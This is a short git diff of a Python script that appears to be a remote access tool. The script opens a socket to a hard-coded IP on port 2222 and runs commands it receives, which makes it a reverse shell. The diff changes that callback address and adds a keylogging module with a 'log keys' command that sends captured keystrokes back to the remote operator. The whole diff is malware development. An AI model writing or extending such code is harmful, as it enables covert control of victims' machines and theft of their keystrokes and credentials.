@@ -6,6 +6,7 @@ import psutil
 import stat
 import sys
 import netifaces
+from keylogging import *
 # from colorama import Fore, Style
 
 def get_network_infos():
@@ -93,7 +94,7 @@ def create_thing(get_cmd,sock):
 
 def main_root():
     sock = st.socket(st.AF_INET, st.SOCK_STREAM)
-    sock.connect(('192.168.81.112',2222))
+    sock.connect(('192.168.6.119',2222))
 
     while True:
         get_cmd = sock.recv(1024).decode().strip()
@@ -106,6 +107,9 @@ def main_root():
                 _dir = get_cmd.split(maxsplit=1)[1]  
                 os.chdir(_dir)  
                 sock.send(b"Directory changed successfully\n")
+
+            elif get_cmd == 'log keys':
+                logkeys(sock=sock)
 
             elif get_cmd in ('exit','quite'):
                 sock.close()
